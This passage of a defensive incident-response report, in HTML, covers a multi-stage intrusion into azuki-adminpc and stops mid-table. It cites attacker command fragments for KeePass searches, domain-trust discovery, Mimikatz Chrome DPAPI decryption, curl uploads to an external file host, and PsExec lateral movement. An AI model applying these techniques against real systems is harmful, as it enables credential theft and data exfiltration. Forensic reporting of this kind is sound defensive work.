@@ -1,0 +1,763 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>AZUKI-IR-2025-1124-ADMINPC — Yousef Nabil</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Barlow:wght@300;400;500;600&family=Barlow+Condensed:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+:root {
+  --bg:        #080a0d;
+  --bg2:       #0c0f14;
+  --surface:   #101520;
+  --surface2:  #141a24;
+  --border:    rgba(255,200,80,0.07);
+  --border2:   rgba(255,200,80,0.14);
+  --border3:   rgba(255,200,80,0.25);
+  --amber:     #f0a500;
+  --amber-dim: rgba(240,165,0,0.10);
+  --amber-glow:rgba(240,165,0,0.04);
+  --red:       #e84040;
+  --red-dim:   rgba(232,64,64,0.12);
+  --green:     #2ecc71;
+  --green-dim: rgba(46,204,113,0.10);
+  --blue:      #4a9eff;
+  --text:      #d4d8e0;
+  --text2:     #7a8090;
+  --text3:     #3a4050;
+  --mono:      'JetBrains Mono', monospace;
+  --cond:      'Barlow Condensed', sans-serif;
+  --sans:      'Barlow', sans-serif;
+  --nav-w:     220px;
+  --top-h:     48px;
+  --radius:    4px;
+}
+
+*,*::before,*::after { box-sizing: border-box; margin:0; padding:0; }
+html { font-size:14px; scroll-behavior:smooth; }
+
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.6;
+  -webkit-font-smoothing: antialiased;
+}
+
+/* dot grid background */
+body::before {
+  content:'';
+  position:fixed; inset:0; z-index:0; pointer-events:none;
+  background-image: radial-gradient(circle, rgba(255,200,80,0.06) 1px, transparent 1px);
+  background-size: 28px 28px;
+}
+
+/* ── TOPBAR ── */
+.topbar {
+  position:fixed; top:0; left:0; right:0; z-index:200;
+  height:var(--top-h);
+  background: rgba(8,10,13,0.96);
+  border-bottom:1px solid var(--border2);
+  backdrop-filter: blur(10px);
+  display:flex; align-items:center;
+  padding:0 24px; gap:16px;
+}
+.tb-analyst {
+  display:flex; flex-direction:column; gap:1px;
+  border-right:1px solid var(--border2);
+  padding-right:16px;
+}
+.tb-name {
+  font-family:var(--cond); font-size:15px; font-weight:700;
+  color:var(--text); letter-spacing:.3px;
+}
+.tb-role {
+  font-family:var(--mono); font-size:8.5px; font-weight:400;
+  letter-spacing:1.8px; text-transform:uppercase; color:var(--text3);
+}
+.tb-mid { flex:1; display:flex; align-items:center; gap:20px; }
+.tb-id {
+  font-family:var(--mono); font-size:11px; color:var(--text3);
+  letter-spacing:.5px;
+}
+.tb-title {
+  font-family:var(--cond); font-size:13px; font-weight:500;
+  color:var(--text2); letter-spacing:.3px;
+  flex:1; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;
+}
+.sev {
+  font-family:var(--mono); font-size:9px; font-weight:600;
+  letter-spacing:2px; text-transform:uppercase;
+  padding:3px 10px; border-radius:2px;
+}
+.sev-critical { background:var(--red); color:#fff; }
+.sev-high     { background:#8a4800; color:#f0a500; border:1px solid var(--amber); }
+
+/* ── LAYOUT ── */
+.layout { display:flex; padding-top:var(--top-h); position:relative; z-index:1; }
+
+/* ── SIDEBAR ── */
+.sidebar {
+  width:var(--nav-w); flex-shrink:0;
+  position:fixed; top:var(--top-h); bottom:0; left:0;
+  background:var(--bg2);
+  border-right:1px solid var(--border2);
+  overflow-y:auto; padding:20px 0 40px;
+  scrollbar-width:thin; scrollbar-color:var(--border2) transparent;
+}
+.nav-section-label {
+  font-family:var(--mono); font-size:8px; font-weight:500;
+  letter-spacing:2.5px; text-transform:uppercase;
+  color:var(--text3); padding:0 18px 8px;
+}
+.nav-link {
+  display:flex; align-items:center; gap:10px;
+  padding:7px 18px; text-decoration:none;
+  color:var(--text3); font-size:12px; font-weight:400;
+  font-family:var(--sans);
+  border-left:2px solid transparent;
+  transition:all .12s ease;
+  cursor:pointer;
+}
+.nav-link:hover { color:var(--text2); background:var(--amber-glow); }
+.nav-link.active {
+  color:var(--amber); border-left-color:var(--amber);
+  background:var(--amber-dim); font-weight:500;
+}
+.nav-idx {
+  font-family:var(--mono); font-size:9px; color:var(--text3);
+  min-width:16px;
+}
+.nav-link.active .nav-idx { color:var(--amber); opacity:.6; }
+
+/* ── MAIN ── */
+.main {
+  margin-left:var(--nav-w);
+  flex:1; min-width:0;
+  padding:36px 48px 80px 44px;
+  max-width:880px;
+}
+
+/* ── COVER ── */
+.cover {
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-top:2px solid var(--amber);
+  border-radius:var(--radius);
+  padding:36px 40px;
+  margin-bottom:28px;
+  position:relative; overflow:hidden;
+}
+.cover::after {
+  content:'';
+  position:absolute; top:0; right:0;
+  width:200px; height:200px;
+  background: radial-gradient(circle at top right, rgba(240,165,0,0.06) 0%, transparent 70%);
+  pointer-events:none;
+}
+.cover-eyebrow {
+  font-family:var(--mono); font-size:9px; font-weight:500;
+  letter-spacing:3px; text-transform:uppercase;
+  color:var(--amber); opacity:.7; margin-bottom:10px;
+}
+.cover-title {
+  font-family:var(--cond); font-size:28px; font-weight:700;
+  color:var(--text); line-height:1.15; margin-bottom:4px;
+  letter-spacing:.3px;
+}
+.cover-sub {
+  font-size:12.5px; color:var(--text2); margin-bottom:26px;
+  letter-spacing:.3px;
+}
+.meta-row {
+  display:grid;
+  grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+  gap:6px;
+}
+.meta-item {
+  background:rgba(0,0,0,.3);
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  padding:8px 11px;
+}
+.meta-key {
+  font-family:var(--mono); font-size:8.5px; font-weight:500;
+  letter-spacing:1.5px; text-transform:uppercase;
+  color:var(--text3); margin-bottom:3px;
+}
+.meta-val {
+  font-size:12.5px; font-weight:500; color:var(--text);
+}
+.meta-val.crit { color:#fca5a5; }
+.meta-val.high { color:var(--amber); }
+
+/* ── SECTION ── */
+.section {
+  margin-bottom:2px;
+  scroll-margin-top:calc(var(--top-h) + 16px);
+}
+.section-header {
+  display:flex; align-items:center; gap:10px;
+  padding:14px 0 10px;
+  border-bottom:1px solid var(--border2);
+  margin-bottom:16px;
+}
+.sh-num {
+  font-family:var(--mono); font-size:9px; font-weight:600;
+  color:var(--amber); opacity:.5; min-width:24px;
+}
+.sh-title {
+  font-family:var(--cond); font-size:13px; font-weight:700;
+  letter-spacing:2.5px; text-transform:uppercase; color:var(--text2);
+}
+.section-body { padding-bottom:24px; }
+
+/* ── SUBSECTION ── */
+.sub { margin:14px 0 10px; }
+.sub-label {
+  font-family:var(--mono); font-size:9px; font-weight:500;
+  letter-spacing:1.8px; text-transform:uppercase;
+  color:var(--amber); opacity:.65;
+  padding-bottom:6px; margin-bottom:8px;
+  border-bottom:1px solid var(--border);
+}
+
+/* ── PROSE ── */
+.p {
+  font-size:13px; line-height:1.75; color:var(--text2);
+  margin-bottom:10px;
+}
+.p strong { color:var(--text); font-weight:600; }
+.p + .p { margin-top:-4px; }
+
+/* ── TABLE ── */
+.tbl-outer { overflow-x:auto; margin:8px 0 14px; border-radius:var(--radius); border:1px solid var(--border2); }
+table { width:100%; border-collapse:collapse; font-size:12px; }
+thead tr { background:rgba(240,165,0,0.06); }
+thead th {
+  font-family:var(--mono); font-size:8.5px; font-weight:500;
+  letter-spacing:1.2px; text-transform:uppercase;
+  color:var(--amber); opacity:.8;
+  padding:9px 13px; text-align:left;
+  border-bottom:1px solid var(--border2);
+  white-space:nowrap;
+}
+tbody tr { border-bottom:1px solid var(--border); }
+tbody tr:last-child { border-bottom:none; }
+tbody tr:hover td { background:var(--amber-glow); }
+td { padding:7px 13px; color:var(--text2); vertical-align:top; line-height:1.5; }
+
+/* ── LIST ── */
+.bl {
+  list-style:none;
+  border:1px solid var(--border);
+  border-radius:var(--radius);
+  overflow:hidden; margin:6px 0;
+}
+.bl li {
+  display:flex; align-items:flex-start; gap:9px;
+  padding:8px 14px 8px 12px;
+  font-size:12.5px; color:var(--text2);
+  border-bottom:1px solid var(--border);
+  border-left:2px solid transparent;
+  line-height:1.55;
+  transition:all .1s ease;
+}
+.bl li:last-child { border-bottom:none; }
+.bl li::before { content:'›'; color:var(--amber); opacity:.5; font-size:15px; line-height:1.3; flex-shrink:0; margin-top:-1px; }
+.bl li:hover { background:var(--amber-glow); border-left-color:rgba(240,165,0,.2); }
+.bl strong { color:var(--text); font-weight:600; }
+
+/* ── TIMELINE ── */
+.tl { padding-left:20px; position:relative; margin:8px 0; }
+.tl::before {
+  content:''; position:absolute; left:5px; top:6px; bottom:6px;
+  width:1px;
+  background:linear-gradient(to bottom, var(--amber), transparent);
+  opacity:.3;
+}
+.tl-row {
+  display:flex; gap:16px;
+  padding:7px 0;
+  position:relative;
+}
+.tl-row::before {
+  content:''; position:absolute; left:-17px; top:13px;
+  width:7px; height:7px; border-radius:50%;
+  background:var(--bg2); border:1.5px solid var(--amber);
+  opacity:.6;
+}
+.tl-t {
+  font-family:var(--mono); font-size:10.5px; font-weight:500;
+  color:var(--amber); opacity:.8;
+  min-width:136px; flex-shrink:0; padding-top:1px;
+}
+.tl-e {
+  font-size:12.5px; color:var(--text2); flex:1; line-height:1.5;
+}
+.tl-e strong { color:var(--text); }
+
+/* ── PHASE ── */
+.phase { margin:10px 0; }
+.phase-tag {
+  display:inline-flex; align-items:center;
+  font-family:var(--mono); font-size:9px; font-weight:600;
+  letter-spacing:1px; text-transform:uppercase;
+  color:var(--text2); background:var(--surface2);
+  border:1px solid var(--border2); border-radius:2px;
+  padding:3px 9px; margin-bottom:6px;
+}
+
+/* ── KQL ── */
+.kql { margin:12px 0; }
+.kql-hd {
+  font-size:11px; color:var(--text2);
+  margin-bottom:5px; padding-left:1px;
+}
+.kql-hd b {
+  font-family:var(--mono); font-size:10.5px;
+  color:var(--amber); font-weight:600; opacity:.9;
+}
+.kql-wrap {
+  background:#05080d;
+  border:1px solid rgba(240,165,0,0.15);
+  border-radius:var(--radius);
+  overflow:hidden;
+}
+.kql-bar {
+  background:rgba(240,165,0,0.05);
+  border-bottom:1px solid rgba(240,165,0,0.1);
+  padding:5px 13px;
+  display:flex; align-items:center; gap:8px;
+}
+.kql-dots { display:flex; gap:4px; }
+.kql-dots i { width:7px; height:7px; border-radius:50%; background:var(--border2); }
+.kql-tag {
+  font-family:var(--mono); font-size:8px; font-weight:600;
+  letter-spacing:2px; text-transform:uppercase;
+  color:var(--amber); opacity:.5;
+}
+.kql-wrap pre {
+  font-family:var(--mono); font-size:11.5px;
+  color:#b3c3e0; line-height:1.7;
+  padding:12px 14px;
+  overflow-x:auto; tab-size:2;
+}
+.kql-wrap pre .pipe { color:var(--text3); }
+.kql-wrap pre .kw   { color:#c084fc; }
+.kql-wrap pre .fn   { color:#60a5fa; }
+.kql-wrap pre .str  { color:#86efac; }
+
+/* ── IMPACT ── */
+.impact-row {
+  display:flex; align-items:flex-start; gap:10px;
+  padding:9px 13px;
+  border-bottom:1px solid var(--border);
+  border-left:2px solid transparent;
+  font-size:12.5px; color:var(--text2); line-height:1.5;
+}
+.impact-row:first-child { border-radius:var(--radius) var(--radius) 0 0; }
+.impact-row:last-child  { border-bottom:none; border-radius:0 0 var(--radius) var(--radius); }
+.impact-row.conf { border-left-color:var(--red); }
+.impact-wrap { border:1px solid var(--border); border-radius:var(--radius); overflow:hidden; margin:6px 0; background:var(--surface); }
+.ibadge {
+  font-family:var(--mono); font-size:8px; font-weight:700;
+  letter-spacing:1.2px; text-transform:uppercase;
+  padding:2px 6px; border-radius:2px; white-space:nowrap;
+  margin-top:2px; flex-shrink:0;
+}
+.ibadge.conf { background:var(--red-dim); color:var(--red); }
+.ibadge.risk { background:var(--amber-dim); color:var(--amber); }
+.impact-row strong { color:var(--text); }
+
+/* ── RISK BANNER ── */
+.risk {
+  display:flex; align-items:flex-start; gap:12px;
+  padding:11px 14px;
+  border-radius:var(--radius);
+  border:1px solid; margin:10px 0;
+  font-size:12.5px; line-height:1.55;
+}
+.risk.critical { background:var(--red-dim); border-color:rgba(232,64,64,.25); color:var(--text2); }
+.risk.high     { background:var(--amber-dim); border-color:rgba(240,165,0,.25); color:var(--text2); }
+.risk-lbl {
+  font-family:var(--mono); font-size:9px; font-weight:700;
+  letter-spacing:2px; text-transform:uppercase;
+  white-space:nowrap; margin-top:2px; flex-shrink:0;
+}
+.risk.critical .risk-lbl { color:var(--red); }
+.risk.high .risk-lbl     { color:var(--amber); }
+.risk strong { color:var(--text); }
+
+/* ── RECS ── */
+.rec-grp { margin:10px 0; }
+.rec-badge {
+  display:inline-flex; font-family:var(--mono); font-size:8.5px; font-weight:700;
+  letter-spacing:1.5px; text-transform:uppercase;
+  padding:3px 9px; border-radius:2px; margin-bottom:6px;
+}
+.rb-now   { background:var(--red-dim); color:var(--red); }
+.rb-short { background:var(--amber-dim); color:var(--amber); }
+.rb-long  { background:var(--green-dim); color:var(--green); }
+
+/* ── FOOTER ── */
+.foot {
+  margin-top:24px; padding-top:18px;
+  border-top:1px solid var(--border);
+  display:flex; justify-content:space-between; align-items:center;
+  font-family:var(--mono); font-size:9.5px; color:var(--text3);
+}
+.foot-conf { color:var(--red); opacity:.5; font-weight:700; letter-spacing:2px; }
+
+code {
+  font-family:var(--mono); font-size:11px;
+  color:#93c5fd; background:rgba(74,158,255,0.1);
+  padding:1px 5px; border-radius:2px;
+  word-break: break-all;
+  overflow-wrap: anywhere;
+}
+.bl li { flex-wrap: wrap; }
+
+::-webkit-scrollbar { width:5px; height:5px; }
+::-webkit-scrollbar-track { background:transparent; }
+::-webkit-scrollbar-thumb { background:var(--border2); border-radius:3px; }
+</style>
+</head>
+<body>
+
+<nav class="topbar">
+  <div class="tb-analyst">
+    <span class="tb-name">Yousef Nabil</span>
+    <span class="tb-role">Incident Response Analyst</span>
+  </div>
+  <div class="tb-mid">
+    <span class="tb-id">AZUKI-IR-2025-1124-ADMINPC</span>
+    <span class="tb-title">Azuki — Multi-Stage Intrusion &amp; Data Exfiltration</span>
+    <span class="sev sev-critical">CRITICAL</span>
+  </div>
+</nav>
+
+<div class="layout">
+<aside class="sidebar">
+  <div class="nav-section-label">Navigation</div>
+<a class="nav-link" href="#summary"><span class="nav-idx">01</span>Executive Summary</a>
+<a class="nav-link" href="#who"><span class="nav-idx">02</span>WHO</a>
+<a class="nav-link" href="#what"><span class="nav-idx">03</span>WHAT</a>
+<a class="nav-link" href="#when"><span class="nav-idx">04</span>WHEN</a>
+<a class="nav-link" href="#where"><span class="nav-idx">05</span>WHERE</a>
+<a class="nav-link" href="#why"><span class="nav-idx">06</span>WHY</a>
+<a class="nav-link" href="#how"><span class="nav-idx">07</span>HOW</a>
+<a class="nav-link" href="#impact"><span class="nav-idx">08</span>Impact</a>
+<a class="nav-link" href="#intel"><span class="nav-idx">09</span>Threat Intel</a>
+<a class="nav-link" href="#iocs"><span class="nav-idx">10</span>IOCs</a>
+<a class="nav-link" href="#recs"><span class="nav-idx">11</span>Recommendations</a>
+<a class="nav-link" href="#kql"><span class="nav-idx">12</span>KQL Queries</a>
+<a class="nav-link" href="#appendix"><span class="nav-idx">13</span>Appendix</a>
+</aside>
+
+<main class="main">
+<div class="cover">
+  <div class="cover-eyebrow">Incident Response Report</div>
+  <div class="cover-title">Azuki Import/Export<br><span style="font-weight:300;font-size:.65em;color:var(--text2)">Multi-Stage Intrusion — AZUKI-ADMINPC</span></div>
+  <div class="cover-sub">AZUKI-IR-2025-1124-ADMINPC &nbsp;·&nbsp; Credential Theft &amp; Data Exfiltration &nbsp;·&nbsp; 2025-11-24</div>
+  <div class="meta-row">
+    <div class="meta-item"><div class="meta-key">Incident ID</div><div class="meta-val">AZUKI-IR-2025-1124-ADMINPC</div></div>
+    <div class="meta-item"><div class="meta-key">Date of Report</div><div class="meta-val">2026-02-19</div></div>
+    <div class="meta-item"><div class="meta-key">Severity</div><div class="meta-val crit">CRITICAL</div></div>
+    <div class="meta-item"><div class="meta-key">Status</div><div class="meta-val">Investigation Complete (Post-Incident Review)</div></div>
+    <div class="meta-item"><div class="meta-key">Escalated To</div><div class="meta-val">Incident Response Lead / SOC Manager</div></div>
+    <div class="meta-item"><div class="meta-key">Analyst</div><div class="meta-val">Yousef Nabil</div></div>
+  </div>
+</div>
+
+<div class="section" id="summary">
+<div class="section-header">
+  <span class="sh-num">01</span>
+  <span class="sh-title">Executive Summary</span>
+</div>
+<div class="section-body"><p class="p">Microsoft Sentinel telemetry indicates a confirmed, operator-driven intrusion impacting the workstation azuki-adminpc. The attacker leveraged compromised credentials for interactive access, deployed a Meterpreter-based C2 implant, performed targeted discovery, staged sensitive business and credential data, and exfiltrated multiple archives to an external file hosting service.</p><p class="p">The activity demonstrates both credential access and collection objectives: browser credential and session extraction (Chrome DPAPI decryption) and theft of financial/business datasets (tax records, contracts, QuickBooks, and banking files). Persistence was established via creation of a new local administrator account and a scheduled task designed to blend with legitimate Windows security components. The attacker also executed log-clearing commands consistent with defence evasion.</p></div>
+</div>
+<div class="section" id="who">
+<div class="section-header">
+  <span class="sh-num">02</span>
+  <span class="sh-title">WHO</span>
+</div>
+<div class="section-body"><ul class="bl"><li><strong>Threat actor:</strong> Unknown — tradecraft consistent with hands-on-keyboard intrusion using common offensive tooling.</li><li><strong>Primary compromised endpoint:</strong> azuki-adminpc.</li><li><strong>Internal beachhead / pivot host:</strong> azuki-sl (10.1.0.204) used to access azuki-adminpc.</li><li><strong>Additional internal target:</strong> azuki-fileserver01 (10.1.0.188) — received remote execution attempts via PsExec.</li><li><strong>Compromised user:</strong> yuki.tanaka — used for interactive discovery and tooling execution.</li><li><strong>Backdoor account created:</strong> yuki.tanaka2 — added to local Administrators.</li></ul></div>
+</div>
+<div class="section" id="what">
+<div class="section-header">
+  <span class="sh-num">03</span>
+  <span class="sh-title">WHAT</span>
+</div>
+<div class="section-body"><ul class="bl"><li>Interactive access to azuki-adminpc from 10.1.0.204 using yuki.tanaka, followed by rapid discovery activity.</li><li>Deployment and execution of a Meterpreter implant (meterpreter.exe) with C2 indicators including named pipe creation (<code>msf-pipe-5902</code>).</li><li>Domain and session discovery: enumeration of RDP sessions (qwinsta/quser), domain trusts (nltest), and network connections (netstat -ano).</li><li>Credential hunting: recursive search for KeePass databases (*.kdbx) and discovery of a plaintext master password file (KeePass-Master-Password.txt), plus an additional password artefact (OLD-Passwords.lnk).</li><li>Browser credential theft using Mimikatz DPAPI modules to decrypt Chrome saved logins and cookies; outputs archived for exfiltration.</li><li>Local data staging under a deceptive Windows-like path (<code>C:\ProgramData\Microsoft\Crypto\staging</code>) and creation of 8 business-data archives for theft.</li><li>Exfiltration using curl form-based uploads (HTTP POST) to store1.gofile.io.</li><li>Persistence and defence evasion: creation of a backdoor local admin (yuki.tanaka2) via base64-obfuscated PowerShell; scheduled task persistence; PowerShell log clearing via wevtutil.</li><li>Lateral movement attempts: retrieval and use of Sysinternals PsExec to push a secondary payload (silentlynx.exe) to internal hosts over ADMIN$ shares.</li></ul></div>
+</div>
+<div class="section" id="when">
+<div class="section-header">
+  <span class="sh-num">04</span>
+  <span class="sh-title">WHEN</span>
+</div>
+<div class="section-body"><p class="p">Key activity timeline (UTC):</p><div class="tl"><div class="tl-row"><span class="tl-t">2025-11-24 15:10:09</span><span class="tl-e">Initial interactive logon to azuki-adminpc from 10.1.0.204 (azuki-sl) using compromised account yuki.tanaka.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:08:58</span><span class="tl-e">RDP session enumeration executed (<code>qwinsta.exe</code> / <code>quser.exe</code>) — hands-on-keyboard discovery.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:09:25</span><span class="tl-e">Domain trust enumeration via <code>nltest.exe /domain_trusts /all_trusts</code>.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:10:07</span><span class="tl-e">Network connection enumeration via <code>NETSTAT.EXE -ano</code>.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:13:45</span><span class="tl-e">Password database search: <code>where /r C:\Users *.kdbx</code>.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:21:11</span><span class="tl-e">curl downloaded masqueraded archive <code>KB5044273-x64.7z</code> from litter.catbox.moe into <code>C:\Windows\Temp\cache</code>.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:24:35</span><span class="tl-e">Named pipe <code>\Device\NamedPipe\msf-pipe-5902</code> created — consistent with Meterpreter C2 activity.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:38:01 – 04:40:30</span><span class="tl-e">Data collection and staging: robocopy created ZIP archives; tar created multiple tar.gz archives under <code>C:\ProgramData\Microsoft\Crypto\staging</code>.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 04:41:51 – 04:49:20</span><span class="tl-e">Exfiltration via curl POST uploads of staged archives to store1.gofile.io/uploadFile.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 05:55:34</span><span class="tl-e">Downloaded m-temp.7z; extracted m.exe (Mimikatz) to perform Chrome credential/cookie decryption via DPAPI.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 05:56:50</span><span class="tl-e">Exfiltration of chrome-session-theft.tar.gz following cookie/session collection.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 05:58:27 – 06:10:41</span><span class="tl-e">PsExec64.exe dropped then used to push silentlynx.exe to 10.1.0.188 and 10.1.0.204 via ADMIN$ shares.</span></div><div class="tl-row"><span class="tl-t">2025-11-25 06:05:01</span><span class="tl-e">Ransom note artefacts created (SILENTLYNX_README.txt) in user Desktop and Documents directories.</span></div></div></div>
+</div>
+<div class="section" id="where">
+<div class="section-header">
+  <span class="sh-num">05</span>
+  <span class="sh-title">WHERE</span>
+</div>
+<div class="section-body"><div class="sub"><div class="sub-label">Hosts</div><div class="tbl-outer"><table><thead><tr><th>Host</th><th>IP</th><th>Role</th></tr></thead><tbody><tr><td>azuki-adminpc</td><td>—</td><td>Primary compromised workstation; execution, staging, and exfiltration host</td></tr><tr><td>azuki-sl</td><td>10.1.0.204</td><td>Compromised internal beachhead used to pivot into azuki-adminpc</td></tr><tr><td>azuki-fileserver01</td><td>10.1.0.188</td><td>Internal file server targeted for payload distribution via PsExec</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Key Paths</div><ul class="bl"><li><code>C:\Windows\Temp\cache</code> — Short-lived tool drop location (downloads, unpacking)</li><li><code>C:\ProgramData\Microsoft\Crypto\staging</code> — Main local data-staging directory</li><li><code>\\10.1.0.188\ADMIN$</code> — Lateral movement target (azuki-fileserver01)</li><li><code>\\10.1.0.204\ADMIN$</code> — Lateral movement target (azuki-sl)</li></ul></div><div class="sub"><div class="sub-label">External Infrastructure</div><div class="tbl-outer"><table><thead><tr><th>Domain / IP</th><th>Role</th></tr></thead><tbody><tr><td>litter.catbox.moe / 108.181.20.36</td><td>Payload hosting — archive downloads (.7z) via HTTPS/443</td></tr><tr><td>store1.gofile.io / 45.112.123.227</td><td>Exfiltration endpoint — form-based uploads via HTTPS/443</td></tr><tr><td>live.sysinternals.com / 172.179.214.166</td><td>PsExec retrieval — legitimate Microsoft Sysinternals site</td></tr></tbody></table></div></div></div>
+</div>
+<div class="section" id="why">
+<div class="section-header">
+  <span class="sh-num">06</span>
+  <span class="sh-title">WHY</span>
+</div>
+<div class="section-body"><p class="p">The observed collection and exfiltration prioritised credential material and business/financial datasets. Chrome credential and session theft provides immediate account takeover opportunities, while staged archives (tax records, contracts, QuickBooks, banking records, and credential sets) suggest financial fraud, business espionage, or follow-on extortion. Persistence mechanisms (local admin backdoor + scheduled task) indicate intent to maintain access beyond the initial intrusion window. Creation of SILENTLYNX_README.txt raises ransomware/extortion risk, even if encryption was not directly observed in the available telemetry.</p></div>
+</div>
+<div class="section" id="how">
+<div class="section-header">
+  <span class="sh-num">07</span>
+  <span class="sh-title">HOW</span>
+</div>
+<div class="section-body"><div class="phase"><span class="phase-tag">Initial Access + Pivot</span><ul class="bl"><li>The attacker used an already-compromised internal system (azuki-sl, 10.1.0.204) to access azuki-adminpc with stolen credentials (yuki.tanaka).</li></ul></div><div class="phase"><span class="phase-tag">Tool Delivery</span><ul class="bl"><li>Using native utilities, the actor downloaded archives from an external hosting service into <code>C:\Windows\Temp\cache</code> and extracted payloads with 7z.</li></ul></div><div class="phase"><span class="phase-tag">Command and Control</span><ul class="bl"><li>A Meterpreter implant executed on azuki-adminpc; behavioural evidence includes creation of named pipe <code>\Device\NamedPipe\msf-pipe-5902</code> (commonly associated with Metasploit/Meterpreter IPC).</li></ul></div><div class="phase"><span class="phase-tag">Discovery</span><ul class="bl"><li>The actor enumerated interactive sessions (qwinsta/quser), domain trust relationships (nltest), and active network connections with owning processes (netstat -ano).</li></ul></div><div class="phase"><span class="phase-tag">Credential Access</span><ul class="bl"><li>The actor searched for password databases (*.kdbx) and obtained a plaintext KeePass master password file. In parallel, Mimikatz (m.exe) was used to decrypt Chrome credentials and cookies via DPAPI (<code>dpapi::chrome</code>), enabling theft of saved passwords and session tokens.</li></ul></div><div class="phase"><span class="phase-tag">Collection + Staging</span><ul class="bl"><li>Business data was copied into a disguised staging directory (<code>C:\ProgramData\Microsoft\Crypto\staging</code>). The actor created multiple ZIP and tar.gz archives to prepare for bulk exfiltration.</li></ul></div><div class="phase"><span class="phase-tag">Exfiltration</span><ul class="bl"><li>The actor uploaded archives using curl with multipart/form-data POST requests to store1.gofile.io/uploadFile. The first observed archive uploaded was credentials.tar.gz.</li></ul></div><div class="phase"><span class="phase-tag">Persistence + Defence Evasion</span><ul class="bl"><li>The actor created a backdoor local administrator (yuki.tanaka2) via base64-obfuscated PowerShell commands, established scheduled-task persistence (<code>Microsoft\Windows\Security\SecurityHealthService</code>), and attempted to reduce telemetry by clearing PowerShell-related logs with wevtutil.</li></ul></div><div class="phase"><span class="phase-tag">Lateral Movement</span><ul class="bl"><li>PsExec was downloaded from live.sysinternals.com and used to execute / push silentlynx.exe to additional internal hosts over ADMIN$ shares.</li></ul></div></div>
+</div>
+<div class="section" id="impact">
+<div class="section-header">
+  <span class="sh-num">08</span>
+  <span class="sh-title">IMPACT</span>
+</div>
+<div class="section-body"><p class="p">Confirmed theft preparation and exfiltration of at least 8 staged business-data archives, plus separate Chrome credential/session theft archives. This materially increases the likelihood of account compromise (browser-saved credentials, session tokens) and broader organisational compromise (KeePass master password exposure).</p><p class="p">If used, the backdoor administrator account (yuki.tanaka2) could provide continued access after password resets. The creation of SILENTLYNX_README.txt suggests the presence of a disruptive/extortion payload and raises ransomware/extortion risk, even if encryption was not directly observed in available telemetry.</p><div class="risk critical"><span class="risk-lbl">Risk: CRITICAL</span><span>Multiple confirmed exfiltration events, credential dumping, backdoor account, and extortion payload artefacts — environment must be treated as fully compromised until remediation is complete.</span></div></div>
+</div>
+<div class="section" id="intel">
+<div class="section-header">
+  <span class="sh-num">09</span>
+  <span class="sh-title">THREAT INTELLIGENCE</span>
+</div>
+<div class="section-body"><p class="p">The intrusion leveraged widely used offensive and dual-use tooling. No attribution to a named threat actor has been made; tradecraft is consistent with financially motivated hands-on-keyboard operators.</p><div class="sub"><div class="sub-label">Tooling Observed</div><ul class="bl"><li><strong>Meterpreter (Metasploit framework)</strong> — named pipe msf-pipe-5902 as behavioural indicator.</li><li><strong>Mimikatz</strong> — DPAPI-based Chrome credential decryption (<code>dpapi::chrome</code>).</li><li><strong>Living-off-the-land utilities</strong> — curl, tar, netstat, nltest, qwinsta/quser, wevtutil, robocopy.</li><li><strong>Sysinternals PsExec</strong> — remote execution and payload distribution to internal hosts.</li></ul></div><div class="sub"><div class="sub-label">MITRE ATT&amp;CK Mapping</div><div class="tbl-outer"><table><thead><tr><th>Technique</th><th>ID</th></tr></thead><tbody><tr><td>Valid Accounts</td><td>T1078</td></tr><tr><td>Windows Command Shell</td><td>T1059.003</td></tr><tr><td>PowerShell</td><td>T1059.001</td></tr><tr><td>Ingress Tool Transfer</td><td>T1105</td></tr><tr><td>Obfuscated/Compressed Files</td><td>T1027</td></tr><tr><td>System Owner/User Discovery</td><td>T1033</td></tr><tr><td>Domain Trust Discovery</td><td>T1482</td></tr><tr><td>System Network Connections Discovery</td><td>T1049</td></tr><tr><td>Unsecured Credentials: Credentials In Files</td><td>T1552.001</td></tr><tr><td>Credentials from Web Browsers</td><td>T1555.003</td></tr><tr><td>Local Data Staging</td><td>T1074.001</td></tr><tr><td>Archive Collected Data</td><td>T1560.001</td></tr><tr><td>Exfiltration Over Web Service</td><td>T1567 / T1567.002</td></tr><tr><td>Scheduled Task/Job</td><td>T1053.005</td></tr><tr><td>Indicator Removal</td><td>T1070</td></tr></tbody></table></div></div></div>
+</div>
+<div class="section" id="iocs">
+<div class="section-header">
+  <span class="sh-num">10</span>
+  <span class="sh-title">OBSERVED IOCs</span>
+</div>
+<div class="section-body"><div class="sub"><div class="sub-label">Host and Account Indicators</div><div class="tbl-outer"><table><thead><tr><th>Indicator</th><th>Type</th><th>Notes</th></tr></thead><tbody><tr><td>azuki-adminpc</td><td>Host</td><td>Primary compromised workstation</td></tr><tr><td>azuki-sl (10.1.0.204)</td><td>Host</td><td>Internal beachhead used for pivot</td></tr><tr><td>azuki-fileserver01 (10.1.0.188)</td><td>Host</td><td>PsExec lateral movement target</td></tr><tr><td>yuki.tanaka</td><td>Account</td><td>Compromised user — interactive access and execution</td></tr><tr><td>yuki.tanaka2</td><td>Account</td><td>Backdoor local admin created by attacker</td></tr><tr><td>kenji.sato</td><td>Account</td><td>Credential observed in PsExec command to 10.1.0.204</td></tr><tr><td>fileadmin</td><td>Account</td><td>Credential observed in PsExec command to 10.1.0.188</td></tr></tbody></table></div></div><div class="sub"><div class="sub-label">Network Indicators</div><div class="tbl-outer"><table><thead><tr><th>Domain / 